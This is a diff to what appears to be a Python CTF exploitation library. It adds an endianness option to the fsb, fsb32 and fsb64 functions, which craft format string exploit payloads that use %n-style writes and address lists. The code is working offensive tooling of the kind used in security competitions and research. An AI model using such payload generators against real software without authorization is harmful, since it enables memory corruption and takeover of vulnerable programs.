@@ -16,7 +16,7 @@ def _fsb_fmtstr(pos, table, bs, written, prefix):
         pos += 1
     return payload
 
-def fsb64(pos, writes, bs=1, written=0, size=8, delta=0):
+def fsb64(pos, writes, bs=1, written=0, size=8, delta=0, endian='little'):
     assert bs in [1, 2, 4]
 
     prefix = {1:"hhn", 2:"hn", 4:"n"}[bs]
@@ -48,11 +48,11 @@ def fsb64(pos, writes, bs=1, written=0, size=8, delta=0):
     payload += b'A' * (((speculated_pos-pos) * 8 - len(payload)) % 8)
 
     # create address list
-    payload += flat(addrList, map=p64)
+    payload += flat(addrList, map=lambda addr:p64(addr, endian))
 
     return payload
 
-def fsb32(pos, writes, bs=1, written=0, size=4, rear=False, delta=0):
+def fsb32(pos, writes, bs=1, written=0, size=4, rear=False, delta=0, endian='little'):
     assert bs in [1, 2, 4]
 
     prefix = {1:"hhn", 2:"hn", 4:"n"}[bs]
@@ -85,11 +85,11 @@ def fsb32(pos, writes, bs=1, written=0, size=4, rear=False, delta=0):
         payload += b'A' * (((speculated_pos-pos) * 4 - len(payload)) % 4)
 
         # create address list
-        payload += flat(addrList, map=p32)
+        payload += flat(addrList, map=lambda addr: p32(addr, endian))
 
     else:    # put address list before format string
         # create address list
-        payload += flat(addrList, map=p32)
+        payload += flat(addrList, map=lambda addr: p32(addr, endian))
         if b'\0' in payload:
             logger.warn("'\\x00' found in address list. Set `rear=True` to put address list after format string.")
 
@@ -98,7 +98,7 @@ def fsb32(pos, writes, bs=1, written=0, size=4, rear=False, delta=0):
 
     return payload
 
-def fsb(pos, writes, bs=1, written=0, bits=32, size=8, rear=None, delta=0, null=None):
+def fsb(pos, writes, bs=1, written=0, bits=32, size=8, rear=None, delta=0, endian='little', null=None):
     """Craft a Format String Exploit payload
     
     Args:
@@ -109,6 +109,7 @@ def fsb(pos, writes, bs=1, written=0, bits=32, size=8, rear=None, delta=0, null=
         bits (int)   : The address bits (32 or 64)
         size (int)   : Bytes to write
         rear (bool)  : Whether put address list after format string or before
+        endian (str) : Endian ('big' or 'little')
         delta (int)  : Set this value when you somehow want to change the start number
         null (bool)  : [no longer works, for compatibility]
 
@@ -121,11 +122,11 @@ def fsb(pos, writes, bs=1, written=0, bits=32, size=8, rear=None, delta=0, null=
     if bits == 32:
         if rear is None:
             rear = False
-        return fsb32(pos, writes, bs, written, size, rear, delta)
+        return fsb32(pos, writes, bs, written, size, rear, delta, endian)
     
     elif bits == 64:
         assert rear is None or rear == True
-        return fsb64(pos, writes, bs, written, size, delta)
+        return fsb64(pos, writes, bs, written, size, delta, endian)
     
     else:
         raise ValueError("`bits` must be 32 or 64")
